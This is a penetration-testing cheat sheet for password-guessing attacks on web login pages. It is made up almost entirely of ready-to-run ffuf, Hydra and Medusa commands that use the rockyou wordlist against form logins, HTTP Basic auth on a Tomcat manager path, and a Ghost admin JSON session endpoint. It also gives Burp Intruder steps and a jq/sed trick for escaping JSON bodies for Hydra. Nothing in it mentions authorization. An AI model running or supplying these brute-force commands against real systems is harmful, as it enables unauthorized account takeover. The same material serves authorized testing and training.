# Online Login Pages Password Attacks

### 1) ffuf

    ffuf -c -w /usr/share/wordlists/rockyou.txt -u http://domain.local/login.php -X POST -d "login_username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"

### 2) Hydra (Requires enumerating the printed error after a failed login)

POST Login

    hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://domain.local/login.php:username=^USER^&password=^PASS^:Login failed"

Basic Authentication attack

    hydra -I -V -C "$WORDLIST" -t 1 "http-get://domain.local:8080/manager/html:A=BASIC:F=401"

### 3) Medusa

    medusa -h domain.local -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^ -m DENY_SIGNAL:"Login failed"

### 4) Burpsuite Intruder

Intercept the request, then send it to Intruder.

Do a Sniper Attack if you know either the username or password, choose the password field, load the wordlist of your choice and start attacking.

If you do not know either of the username and password, do a pitchfork attack instead.

## Attack JSON POST logins

### 1) Save JSON data in the request to a file

example.json

    {"username":"admin@domain.tld","password":"password"}

### 2) Grab the response code via BurpSuite to add it to Hydra command later to use

Example response code

    401

### 3) Minify the JSON and escape colons, since Hydra uses colons as field delimiters

    jq -c . /tmp/data.json | sed 's/:/\\:/g'

### 4) Run the attack

    HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -I -f -V -l 'admin@domain.tld' -P ~/Pentest/WordLists/rockyou.txt 'http-post-form://domain.tld/ghost/api/admin/session:{"username"\:"admin@domain.tld","password"\:"password"}:H=X-Ghost-Version\: 5.58:H=Content-Type\: application/json;charset=UTF-8:F=401'



   
